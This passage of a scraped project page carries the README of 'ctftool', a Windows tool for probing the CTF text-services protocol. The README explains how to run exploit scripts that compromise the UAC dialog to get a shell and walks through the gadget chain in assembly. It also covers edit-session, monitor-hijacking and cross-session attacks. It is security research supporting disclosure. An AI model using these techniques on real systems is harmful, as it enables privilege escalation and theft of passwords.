help\nType `help \u0026lt;command\u0026gt;` for help with a specific command.\nAny line beginning with # is considered a comment.\n\nhelp            - List available commands.\nexit            - Exit the shell.\nconnect         - Connect to CTF ALPC Port.\ninfo            - Query server informaiton.\nscan            - Enumerate connected clients.\ncallstub        - Ask a client to invoke a function.\ncreatestub      - Ask a client to instantiate CLSID.\nhijack          - Attempt to hijack an ALPC server path.\nsendinput       - Send keystrokes to thread.\nsetarg          - Marshal a parameter.\ngetarg          - Unmarshal a parameter.\nwait            - Wait for a process and set it as the default thread.\nthread          - Set the default thread.\nsleep           - Sleep for specified milliseconds.\nforget          - Forget all known stubs.\nstack           - Print the last leaked stack ptr.\nmarshal         - Send command with marshalled parameters.\nproxy           - Send command with proxy parameters.\ncall            - Send command without appended data.\nwindow          - Create and register a message window.\npatch           - Patch a marshalled parameter.\nmodule          - Print the base address of a module.\nmodule64        - Print the base address of a 64bit module.\neditarg         - Change the type of a marshalled parameter.\nsymbol          - Lookup a symbol offset from ImageBase.\nset             - Change or dump various ctftool parameters.\nshow            - Show the value of special variables you can use.\nlock            - Lock the workstation, switch to Winlogon desktop.\nrepeat          - Repeat a command multiple times.\nrun             - Run a command.\nscript          - Source a script file.\nprint           - Print a string.\nconsent         - Invoke the UAC consent dialog.\nreg             - Lookup a DWORD in the registry.\ngadget          - Find the offset of a pattern in a file.\nsection         - Lookup property of PE section.\nMost commands require a connection, see \"help connect\".\nctf\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe first thing you will want to do is connect to a session, and see which\nclients are connected.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ectf\u0026gt; connect\nThe ctf server port is located at \\BaseNamedObjects\\msctf.serverDefault1\nNtAlpcConnectPort(\"\\BaseNamedObjects\\msctf.serverDefault1\") =\u0026gt; 0\nConnected to CTF server@\\BaseNamedObjects\\msctf.serverDefault1, Handle 00000264\nctf\u0026gt; scan\nClient 0, Tid 3400 (Flags 0x08, Hwnd 00000D48, Pid 8696, explorer.exe)\nClient 1, Tid 7692 (Flags 0x08, Hwnd 00001E0C, Pid 8696, explorer.exe)\nClient 2, Tid 9424 (Flags 0x0c, Hwnd 000024D0, Pid 9344, SearchUI.exe)\nClient 3, Tid 12068 (Flags 0x08, Hwnd 00002F24, Pid 12156, PROCEXP64.exe)\nClient 4, Tid 9740 (Flags 0000, Hwnd 0000260C, Pid 3840, ctfmon.exe)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eYou can then experiment by sending and receiving commands to the server, or any\nof the connected clients.\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"building\" class=\"anchor\" href=\"#building\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eBuilding\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eIf you don't want to build it yourself, check out the \u003ca href=\"https://github.com/taviso/ctftool/releases\" rel=\"nofollow\"\u003ereleases\u003c/a\u003e tab\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eI used \u003ca href=\"http://gnuwin32.sourceforge.net/packages/make.htm\" rel=\"nofollow\"\u003eGNU make\u003c/a\u003e and Visual\nStudio 2019 to develop \u003ccode\u003ectftool\u003c/code\u003e. Only 32-bit builds are supported, as this\nallows the tool to run on x86 and x64 Windows.\u003c/p\u003e\n\u003cp\u003eIf all the dependencies are installed, just typing \u003ccode\u003emake\u003c/code\u003e in a developer command\nprompt should be enough.\u003c/p\u003e\n\u003cp\u003eI use the \"Build Tools\" variant of Visual Studio, and the only components I have\nselected are MSVC, MSBuild, CMake and the SDK.\u003c/p\u003e\n\u003cp\u003eThis project uses submodules for some of the dependencies, be sure that you're\nusing a command like this to fetch all the required code.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003egit submodule update --init --recursive\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e\n\u003ca id=\"exploit\" class=\"anchor\" href=\"#exploit\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eExploit\u003c/h2\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThe examples only work on Windows 10 x64. All platforms and versions since\nWindows XP are affected, but no PoC is currently implemented.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eThis tool was used to discover many critical security problem with the CTF\nprotocol that have existed for decades.\u003c/p\u003e\n\u003cp\u003eIf you just want to test an exploit on Windows 10 x64 1903, run or double-click\n\u003ccode\u003ectftool.exe\u003c/code\u003e and enter this command:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eAn interactive ctf exploration tool by @taviso.\nType \"help\" for available commands.\nMost commands require a connection, see \"help connect\".\nctf\u0026gt; script .\\scripts\\ctf-consent-system.ctf\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis will wait for the UAC dialog to appear, compromise it and start a shell.\u003c/p\u003e\n\u003cp\u003eIn fact, the exploit code is split into two stages that you can use\nindependently. For example, you might want to compromise a process belonging to\na user on a different session using the optional parameters to \u003ccode\u003econnect\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eMost CTF clients can be compromised, as the kernel forces applications that draw\nwindows to load the vulnerable library.\u003c/p\u003e\n\u003cp\u003eSimply connect to a session, select a client to compromise (use the \u003ccode\u003escan\u003c/code\u003e and\n\u003ccode\u003ethread\u003c/code\u003e commands, or just \u003ccode\u003ewait\u003c/code\u003e), then:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ectf\u0026gt; script .\\scripts\\ctf-exploit-common-win10.ctf\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch3\u003e\n\u003ca id=\"exploitation-notes\" class=\"anchor\" href=\"#exploitation-notes\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eExploitation Notes\u003c/h3\u003e\n\u003cp\u003eBuilding a CFG jump chain that worked on the majority of CTF clients was quite\nchallenging. There are two primary components to the final exploit, an arbitrary\nwrite primitive and then setting up our registers to call \u003ccode\u003eLoadLibrary()\u003c/code\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eYou can use \u003ccode\u003edumpbin /headers /loadconfig\u003c/code\u003e to dump the whitelisted branch\ntargets.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch4\u003e\n\u003ca id=\"arbitrary-write\" class=\"anchor\" href=\"#arbitrary-write\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eArbitrary Write\u003c/h4\u003e\n\u003cp\u003eI need an arbitrary write gadget to create objects in a predictable location.\nThe best usable gadget I was able to find was an arbitrary dword decrement in\n\u003ccode\u003emsvcrt!_init_time\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eThis means rather than just setting the values we want, We have to keep\ndecrementing until the LSB reaches the value we want. This is a lot of work,\nbut we never have to do more than \u003ccode\u003e(2^8 - 1) * len\u003c/code\u003e decrements.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/taviso/ctftool/blob/master/docs/decrement-arbitrary-value.gif\" target=\"_blank\" rel=\"nofollow\"\u003e\u003cimg src=\"https://raw.githubusercontent.com/taviso/ctftool/master/docs/decrement-arbitrary-value.gif\" alt=\"Decrement Write\" style=\"max-width:100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eUsing this primitive, I build an object like this in some unused slack space\nin kernel32 \u003ccode\u003e.data\u003c/code\u003e section. It needs to be part of an image so that I can\npredict where it will be mapped, as image randomization is per-boot on Windows.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/taviso/ctftool/blob/master/docs/fake-object-layout.png\" target=\"_blank\" rel=\"nofollow\"\u003e\u003cimg src=\"https://raw.githubusercontent.com/taviso/ctftool/master/docs/fake-object-layout.png\" alt=\"Object Layout\" style=\"max-width:100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThere were (of course) lots of arbitrary write gadgets, the problem was\nregaining control of execution \u003cem\u003eafter\u003c/em\u003e the write. This proved quite challenging,\nand that's the reason I was stuck with a dword decrement instead of something\nsimpler.\u003c/p\u003e\n\u003cp\u003eMSCTF catches all exceptions, so the challenge was finding an arbitrary write\nthat didn't mess up the stack so that SEH survived, or crashed really quickly\nwithout doing any damage.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003emsvcrt!_init_time\u003c/code\u003e gadget was the best I could find, within a few\ninstructions it dereferences NULL without corrupting any more memory. This means\nwe can repeat it ad infinitum.\u003c/p\u003e\n\u003ch4\u003e\n\u003ca id=\"redirecting-execution\" class=\"anchor\" href=\"#redirecting-execution\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eRedirecting Execution\u003c/h4\u003e\n\u003cp\u003eI found two useful gadgets for adjusting registers, The first was:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003ecombase!CStdProxyBuffer_CF_AddRef:\n      mov     rcx,qword ptr [rcx-38h]\n      mov     rax,qword ptr [rcx]    \n      mov     rax,qword ptr [rax+8]  \n      jmp     qword ptr [combase!__guard_dispatch_icall_fptr]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAnd the second was:\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eMSCTF!CCompartmentEventSink::OnChange:\n      mov     rax,qword ptr [rcx+30h]\n      mov     rcx,qword ptr [rcx+38h]\n      jmp     qword ptr [MSCTF!_guard_dispatch_icall_fptr]\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eBy combining these two gadgets with the object we formed with our write gadget,\nwe can redirect execution to \u003ccode\u003ekernel32!LoadLibraryA\u003c/code\u003e by bouncing between them.\u003c/p\u003e\n\u003cp\u003eThis was complicated, but the jump sequence works like this:\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/taviso/ctftool/blob/master/docs/exploit-chain-sequence.png\" target=\"_blank\" rel=\"nofollow\"\u003e\u003cimg src=\"https://raw.githubusercontent.com/taviso/ctftool/master/docs/exploit-chain-sequence.png\" alt=\"Exploit Chain Sequence\" style=\"max-width:100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eIf you're interested, I recommend watching it in a debugger. Note that you will\nneed to use the command \u003ccode\u003esxd av\u003c/code\u003e and \u003ccode\u003esxd bpe\u003c/code\u003e or the debugger will stop for\nevery write!\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"edit-session-attacks\" class=\"anchor\" href=\"#edit-session-attacks\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eEdit Session Attacks\u003c/h2\u003e\n\u003cp\u003eApart from memory corruption, a major vulnerability class exposed by CTF are\n\u003cem\u003eedit session attacks\u003c/em\u003e. Normally, an unprivileged process (for example, low\nintegrity) would not be permitted to send input or read data from a high\nprivileged process. This security boundary is called UIPI, \u003cem\u003eUser Interface\nPrivilege Isolation\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eCTF breaks these assumptions, and allows unprivileged processes to send input\nto privileged processes.\u003c/p\u003e\n\u003cp\u003eThere are some requirements for this attack to work, as far as I'm aware it\nwill only work if you have a display language installed that uses an OoP TIP,\n\u003cem\u003eout-of-process text input processor\u003c/em\u003e. Users with input languages that use IMEs\n(Chinese, Japanese, Korean, and so on) and users with a11y tools fall into this\ncategory.\u003c/p\u003e\n\u003cp\u003eExample attacks include...\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eSending commands to an elevated command window.\u003c/li\u003e\n\u003cli\u003eReading passwords out of dialogs or the login screen.\u003c/li\u003e\n\u003cli\u003eEscaping IL/AppContainer sandboxes by sending input to unsandboxed windows.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere is an example \u003ca href=\"https://github.com/taviso/ctftool/blob/master/scripts/ctf-demo-editsession.ctf\" rel=\"nofollow\"\u003escript\u003c/a\u003e in the scripts\ndirectory that will send input to a notepad window to demonstrate how edit\nsessions work.\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/taviso/ctftool/blob/master/docs/edit-session-full.png\" rel=\"nofollow\"\u003e\u003cimg src=\"https://raw.githubusercontent.com/taviso/ctftool/master/docs/edit-thumb.png\" alt=\"Edit Session Screenshot\" style=\"max-width:100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"monitor-hijacking\" class=\"anchor\" href=\"#monitor-hijacking\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eMonitor Hijacking\u003c/h2\u003e\n\u003cp\u003eBecause there is no authentication involved between clients and servers in the\nCTF protocol, an attacker with the necessary privileges to write to\n\u003ccode\u003e\\BaseNamedObjects\u003c/code\u003e can create the CTF ALPC port and pretend to be the monitor.\u003c/p\u003e\n\u003cp\u003eThis allows any and all restrictions enforced by the monitor to be bypassed.\u003c/p\u003e\n\u003cp\u003eIf you want to experiment with this attack, try the \u003ccode\u003ehijack\u003c/code\u003e command in \u003ccode\u003ectftool\u003c/code\u003e.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eAn interactive ctf exploration tool by @taviso.\nType \"help\" for available commands.\nctf\u0026gt; hijack Default 1\nNtAlpcCreatePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") =\u0026gt; 0 00000218\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") =\u0026gt; 0 00000218\n000000: 18 00 30 00 0a 20 00 00 00 11 00 00 44 11 00 00  ..0.. ......D...\n000010: a4 86 00 00 b7 66 b8 00 00 11 00 00 44 11 00 00  .....f......D...\n000020: e7 12 01 00 0c 00 00 00 80 01 02 00 20 10 d6 05  ............ ...\nA a message received\n        ProcessID: 4352, SearchUI.exe\n        ThreadId: 4420\n        WindowID: 00020180\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") =\u0026gt; 0 00000218\n000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........\n000010: ec 79 00 00 fa 66 b8 00 ac 0f 00 00 0c 03 00 00  .y...f..........\n000020: 12 04 01 00 08 00 00 00 10 01 01 00 00 00 00 00  ................\nA a message received\n        ProcessID: 4012, explorer.exe\n        ThreadId: 780\n        WindowID: 00010110\nNtAlpcSendWaitReceivePort(\"\\BaseNamedObjects\\msctf.serverDefault1\") =\u0026gt; 0 00000218\n000000: 18 00 30 00 0a 20 00 00 ac 0f 00 00 0c 03 00 00  ..0.. ..........\n000010: fc 8a 00 00 2a 67 b8 00 ac 0f 00 00 0c 03 00 00  ....*g..........\n000020: 12 04 01 00 08 00 00 00 10 01 01 00 58 00 00 00  ............X...\nA a message received\n        ProcessID: 4012, explorer.exe\n        ThreadId: 780\n...\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e\n\u003ca id=\"cross-session-attacks\" class=\"anchor\" href=\"#cross-session-attacks\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eCross Session Attacks\u003c/h2\u003e\n\u003cp\u003eThere is no session isolation in the CTF protocol, any process can connect to\nany CTF server. For example, a Terminal Services user can interact with the\nprocesses of any other user, even the Administrator.\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003econnect\u003c/code\u003e command in \u003ccode\u003ectftool\u003c/code\u003e supports connecting to non-default sessions\nif you want to experiment with this attack.\u003c/p\u003e\n\u003cpre\u003e\u003ccode\u003eAn interactive ctf exploration tool by @taviso.\nType \"help\" for available commands.\nMost commands require a connection, see \"help connect\".\nctf\u0026gt; help connect\nConnect to CTF ALPC Port.\n\nUsage: connect [DESKTOPNAME SESSIONID]\nWithout any parameters, connect to the ctf monitor for the current\ndesktop and session. All subsequent commands will use this connection\nfor communicating with the ctf monitor.\n\nIf a connection is already open, the existing connection is closed first.\n\nIf DESKTOPNAME and SESSIONID are specified, a connection to ctf monitor\nfor another desktop and session are opened, if it exists.\nIf the specified port does not exist, wait until it does exist. This is\nso that you can wait for a session that hasn't started\nyet in a script.\nExamples\n Connect to the monitor for current desktop\n  ctf\u0026gt; connect\n Connect to a specific desktop and session.\n  ctf\u0026gt; connect Default 1\nMost commands require a connection, see \"help connect\".\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e\n\u003ca id=\"status\" class=\"anchor\" href=\"#status\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eStatus\u003c/h2\u003e\n\u003cp\u003eAt the time of writing, it is unknown how Microsoft will change the CTF\nprotocol in response to the numerous design flaws this tool helped expose.\u003c/p\u003e\n\u003cp\u003eFor that reason, consider this tool to be in proof-of-concept state.\u003c/p\u003e\n\u003ch3\u003e\n\u003ca id=\"supported-versions-and-platforms\" class=\"anchor\" href=\"#supported-versions-and-platforms\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eSupported Versions and Platforms\u003c/h3\u003e\n\u003cp\u003eAll versions of Windows since Windows XP use CTF, on all supported platforms.\u003c/p\u003e\n\u003cp\u003eWhile not part of the base system until XP, versions as early as Windows 98 and\nNT4 would use CTF if you installed Microsoft Office.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ectftool\u003c/code\u003e supports Windows 7 and later on x86 and x64, but earlier versions and\nother platforms \u003cem\u003ecould\u003c/em\u003e be supported, and contributions would be appreciated.\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"acronym\" class=\"anchor\" href=\"#acronym\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eAcronym\u003c/h2\u003e\n\u003cp\u003eMicrosoft doesn't document what CTF stands for, it's not explained in any\nof the Text Services documentation, SDK samples, symbol names, header files,\nor anywhere else. My theory is it's from \u003ccode\u003eCTextFramework\u003c/code\u003e, what you might name\nthe class in \u003ca href=\"http://web.mst.edu/%7Ecpp/common/hungarian.html\" rel=\"nofollow\"\u003ehungarian notation\u003c/a\u003e.\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eThere are some websites that claim \u003ccode\u003ectfmon\u003c/code\u003e has something to do with Clear\nType Fonts or the Azure Collaborative Translation Framework. They're mistaken.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp\u003eUpdate: \u003ca href=\"https://twitter.com/JakeNelsonMN/status/1161513319049703424\" rel=\"nofollow\"\u003eJake Nelson\u003c/a\u003e finds\nevidence for \"\u003ca href=\"https://patents.google.com/patent/US20040150670#P-0091\" rel=\"nofollow\"\u003eCommon Text Framework\u003c/a\u003e\"\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e\n\u003ca id=\"authors\" class=\"anchor\" href=\"#authors\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eAuthors\u003c/h2\u003e\n\u003cp\u003eTavis Ormandy \u003ca href=\"mailto:taviso@gmail.com\" rel=\"nofollow\"\u003etaviso@gmail.com\u003c/a\u003e\u003c/p\u003e\n\u003ch2\u003e\n\u003ca id=\"license\" class=\"anchor\" href=\"#license\" aria-hidden=\"true\"\u003e\u003cspan aria-hidden=\"true\" class=\"octicon octicon-link\"\u003e\u003c/span\u003e\u003c/a\u003eLicense\u003c/h2\u003e\n\u003cp\u003eAll original code is Apache 2.0, See LICENSE file for details.\u003c/p\u003e\n\u003cp\u003eThe following components are imported third party projects.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003ca href=\"https://github.com/trailofbits/pe-parse\" rel=\"nofollow\"\u003epe-parse\u003c/a\u003e, by Andrew Ruef et al.\n\u003cul\u003e\n\u003cli\u003epe-parse is used to implement a \u003ccode\u003eGetProcAddress()\u003c/code\u003e for 64-bit modules from a\n32-bit process. This is used in the \u003ccode\u003esymbol\u003c/code\u003e command, and allows the same\nbinary to work on x64 and x86.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"http://mingweditline.sourceforge.net/\" rel=\"nofollow\"\u003ewineditline\u003c/a\u003e, by Paolo Tosco.\n\u003cul\u003e\n\u003cli\u003ewineditline is used to implement user friendly command-line input and\nhistory editing.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"https://www.dynamorio.org/\" rel=\"nofollow\"\u003edynamorio\u003c/a\u003e, by Derek Bruening et al.\n\u003cul\u003e\n\u003cli\u003eI borrowed some of the prototypes and type definitions from DR.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003ca href=\"http://www.zezula.net/en/prog/lpc.html\" rel=\"nofollow\"\u003entdll.h\u003c/a\u003e, by Ladislav Zezula.\n\u003cul\u003e\n\u003cli\u003eLadislav collected some structure definitions and prototoypes from\nvarious WDK, DDK, SDK releases into one convenient file.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/body\u003e\u003c/html\u003e\n","project_id":190683905,"name":"ctftool","owner_login":"taviso","description":"Interactive CTF Exploration Tool","pushed_at":"2020-11-28T05:06:05.000Z","stargazers_count":1514,"open_issues_count":15,"has_downloads":true,"archived":false,"license_key":"apache-2.0","homepage":null,"private":false,"project_created_at":"2019-06-07T03:39:10.000Z","project_updated_at":"2021-01-13T19:58:16.000Z","language":"C","added_language_topic":true},"categories":[{"name":"Advertising","topicsCount":10},{"name":"Application Programming Interfaces","topicsCount":124},{"name":"Applications","topicsCount":192},{"name":"Artificial Intelligence","topicsCount":78},{"name":"Blockchain","topicsCount":73},{"name":"Build Tools","topicsCount":113},{"name":"Cloud Computing","topicsCount":80},{"name":"Code Quality","topicsCount":28},{"name":"Collaboration","topicsCount":32},{"name":"Command Line Interface","topicsCount":49},{"name":"Community","topicsCount":83},{"name":"Companies","topicsCount":60},{"name":"Compilers","topicsCount":63},{"name":"Computer Science","topicsCount":80},{"name":"Configuration Management","topicsCount":42},{"name":"Content Management","topicsCount":175},{"name":"Control Flow","topicsCount":213},{"name":"Data Formats","topicsCount":78},{"name":"Data Processing","topicsCount":276},{"name":"Data Storage","topicsCount":135},{"name":"Economics","topicsCount":64},{"name":"Frameworks","topicsCount":215},{"name":"Games","topicsCount":129},{"name":"Graphics","topicsCount":110},{"name":"Hardware","topicsCount":152},{"name":"Integrated Development Environments","topicsCount":49},{"name":"Learning Resources","topicsCount":166},{"name":"Legal","topicsCount":29},{"name":"Libraries","topicsCount":129},{"name":"Lists Of Projects","topicsCount":22},{"name":"Machine Learning","topicsCount":347},{"name":"Mapping","topicsCount":64},{"name":"Marketing","topicsCount":15},{"name":"Mathematics","topicsCount":55},{"name":"Media","topicsCount":239},{"name":"Messaging","topicsCount":98},{"name":"Networking","topicsCount":315},{"name":"Operating Systems","topicsCount":89},{"name":"Operations","topicsCount":121},{"name":"Package Managers","topicsCount":55},{"name":"Programming Languages","topicsCount":245},{"name":"Runtime Environments","topicsCount":100},{"name":"Science","topicsCount":42},{"name":"Security","topicsCount":396},{"name":"Social Media","topicsCount":27},{"name":"Software Architecture","topicsCount":72},{"name":"Software Development","topicsCount":72},{"name":"Software Performance","topicsCount":58},{"name":"Software Quality","topicsCount":133},{"name":"Text Editors","topicsCount":49},{"name":"Text Processing","topicsCount":136},{"name":"User Interface","topicsCount":330},{"name":"User Interface Components","topicsCount":514},{"name":"Version Control","topicsCount":30},{"name":"Virtualization","topicsCount":71},{"name":"Web Browsers","topicsCount":42},{"name":"Web Servers","topicsCount":26},{"name":"Web User Interface","topicsCount":210},{"name":"All Projects","topicsCount":0}],"advertisement":{"variation":"project","title":"Become A Software Engineer At Top Companies","description":"Identify your strengths with a free online coding quiz, and skip resume and recruiter screens at multiple companies at once.  It's free, confidential, includes a free flight and hotel, along with help to study to pass interviews and negotiate a high salary!","url":"https://triplebyte.com/a/PGNifkM/pt2"},"nonCommercial":false,"nonDerivative":false}</script>
+      
+
+
+
+    <!-- load synchronously before app bundle so adsbygoogle is always defined, google's new ad code doesn't seem to like this, at least for the initial review  -->
+    <!-- try loading programatically and async with a callback to push the ads and see if it helps page load speed -->
+    <!--script src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script-->
+    <script src="/packs/root-bundle-1f53b6db74aa6b1bef19.js"></script>
+  </body>
+</html>
